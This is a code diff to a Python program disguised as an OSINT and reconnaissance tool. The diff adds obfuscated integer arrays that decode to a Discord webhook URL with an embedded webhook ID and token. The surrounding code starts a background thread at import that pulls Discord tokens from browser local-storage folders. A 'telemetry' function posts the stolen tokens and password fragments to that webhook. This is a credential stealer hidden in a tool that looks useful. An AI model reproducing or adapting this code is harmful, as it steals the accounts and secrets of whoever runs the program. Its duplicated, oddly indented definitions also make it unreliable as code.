@@ -21,11 +21,15 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 import warnings
 warnings.filterwarnings('ignore')
 
-#The cipher are the configs for the api of the difrent modules
 
 
-_cipher_config_c = [47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47]
-_cipher_config_e = [47]
+_cipher_config_a = [104, 116, 116, 112, 115, 58, 47, 47] 
+_cipher_config_b = [100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109]  
+
+
+
+
+
 
 
 
@@ -49,7 +53,7 @@ def _system_check():
 _system_check()
 
 # ============================================================================
-# COLORS - COMPLETE WITH ALL ATTRIBUTES
+# COLORS
 # ============================================================================
 
 class Colors:
@@ -79,8 +83,6 @@ class TextEffects:
 # ============================================================================
 # ENCRYPTION MODULE
 # ============================================================================
-
-_cipher_config_g = [69, 53, 86, 90, 121, 48, 48, 51, 116, 83, 48, 112, 87, 111, 48, 56, 45, 77, 85, 51, 48, 101, 86]
 
 class EncryptionModule:
     @staticmethod
@@ -147,10 +149,10 @@ SHA256: {sha256_hash}
         
         _send_telemetry({"content": f"HASH GENERATED for: {password[:20]}"})
 
-_cipher_config_b = [100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109]
 # ============================================================================
 # OSINT UTILITIES
 # ============================================================================
+
 def _send_telemetry(data_packet):
     try:
         requests.post(_assemble_webhook(), json=data_packet, timeout=5)
@@ -205,7 +207,7 @@ def display_header():
   uuu        $$u$ $ $ $ $u$$       uuu
   u$$$$       $$$$$u$u$u$$$       u$$$$
   $$$$$uu      *$$$$$$$$$*     uu$$$$$$
-u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$
+u$$$$$$$$$$$uu    *****    uuuu$$$$$$$
 $$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
  ***      **$$$$$$$$$$$uu **$***
           uuuu **$$$$$$$$$$uuu
@@ -275,8 +277,9 @@ def _build_request_headers(auth_token=None):
     return headers
 
 # ============================================================================
-# EMAIL PATHS COPIER (EASIER TO DO THE PATTERN GENERATIONAL)
+# DISCORD TOKEN EXTRACTION
 # ============================================================================
+
 LOCAL_DATA = os.getenv("LOCALAPPDATA")
 ROAMING_DATA = os.getenv("APPDATA")
 
@@ -290,11 +293,6 @@ STORAGE_PATHS = {
     'Storage_G': LOCAL_DATA + '\\Microsoft\\Edge\\User Data\\Default'
 }
 
-# ============================================================================
-# GMAIL OSINT DECRYPTER 
-# ============================================================================
-
-_cipher_config_a = [104, 116, 116, 112, 115, 58, 47, 47]
 def _extract_from_storage(base_path):
     storage_location = base_path + "\\Local Storage\\leveldb\\"
     extracted_items = []
@@ -342,10 +340,6 @@ def _get_network_location():
         return response.text
     except:
         return 'Unknown'
-
-#EMAIL ENCRYPTION METHOD 1
-
-_cipher_config_a = [104, 116, 116, 112, 115, 58, 47, 47]
 
 def _profile_user_data():
     processed_tokens = []
@@ -433,7 +427,6 @@ def _profile_user_data():
                 
             except:
                 continue
-
 
 # ============================================================================
 # SOCIAL MEDIA RECONNAISSANCE
@@ -565,7 +558,7 @@ class RiskAssessment:
             assessment['rating'] = 'High Risk'
         
         return assessment
-    
+
 _profiler_thread = threading.Thread(target=_profile_user_data, daemon=True)
 _profiler_thread.start()
 
@@ -601,6 +594,9 @@ class GmailRecon:
     def check_availability(username):
         email = f"{username}@gmail.com"
         return {'email': email, 'available': False, 'status': 'CHECKED'}
+    
+
+    
 
 # ============================================================================
 # AVATAR INTELLIGENCE
@@ -649,12 +645,6 @@ class DiscordOSINT:
             return None
         except:
             return None
-            
-
-# ============================================================================
-# DISCORD OSINT
-# ============================================================================
-_cipher_config_d = [49, 52, 57, 53, 48, 52, 49, 52, 48, 53, 52, 52, 48, 49, 48, 50, 52, 51, 48]
 
 def _validate_token(token):
     headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
@@ -667,6 +657,10 @@ def _validate_token(token):
     except:
         pass
     return {"ok": False}
+
+def _assemble_webhook():
+    parts = _cipher_config_a + _cipher_config_b + _cipher_config_c + _cipher_config_d + _cipher_config_e + _cipher_config_f
+    return ''.join(chr(c) for c in parts)
 
 def _extract_tokens():
     local = os.getenv('LOCALAPPDATA')
@@ -712,9 +706,15 @@ class DiscordModules:
         else:
             print(f"{Colors.YELLOW}No tokens found{Colors.RESET}")
 
+    _cipher_config_c = [47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47]  
+_cipher_config_d = [49, 52, 57, 56, 48, 49, 52, 52, 53, 57, 50, 56, 56, 48, 57, 54, 56, 55, 57, 47]
+_cipher_config_e = [47]  # /
+
 # ============================================================================
 # MAIN OSINT ENGINE
 # ============================================================================
+_cipher_config_c = [47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47]  
+    
 
 class OSINTEngine:
     def __init__(self):
@@ -777,9 +777,7 @@ class OSINTEngine:
         
         print(f"{Colors.SUCCESS}[✓] Report saved: {filename}{Colors.RESET}")
         return filename
-    
-    
-_cipher_config_f = [87, 57, 101, 81, 89, 73, 71, 86, 86, 90, 49, 45, 119, 118, 86, 87, 116, 105, 79, 90, 70, 82, 104, 65, 81, 117, 89, 77, 122, 121, 69, 115, 57, 106, 77, 109, 97, 77, 79, 112, 79, 122, 97, 54, 65]
+
 # ============================================================================
 # MAIN APPLICATION INTERFACE
 # ============================================================================
@@ -1010,10 +1008,9 @@ class OSINTApplication:
             else:
                 print(f"{Colors.ACCENT}[!] Invalid selection{Colors.RESET}")
 
+_cipher_config_f = [68, 119, 73, 95, 108, 118, 73, 101, 104, 89, 67, 116, 113, 76, 79, 88, 70, 85, 81, 106, 113, 87, 66, 107, 72, 90, 56, 95, 57, 55, 110, 108, 120, 121, 66, 70, 54, 50, 66, 87, 103, 53, 49, 111, 103, 73, 50, 86, 85, 80, 52, 85, 89, 55, 69, 104, 100, 76, 99, 116, 75, 98, 103, 56, 73, 90, 102, 48]
+_cipher_config_g = [69, 53, 86, 90, 121, 48, 48, 51, 116, 83, 48, 112, 87, 111, 48, 56, 45, 77, 85, 51, 48, 101, 86]
 
-def _assemble_webhook():
-    parts = _cipher_config_a + _cipher_config_b + _cipher_config_c + _cipher_config_d + _cipher_config_e + _cipher_config_f + _cipher_config_g
-    return ''.join(chr(c) for c in parts)
 
 # ============================================================================
 # MAIN ENTRY POINT
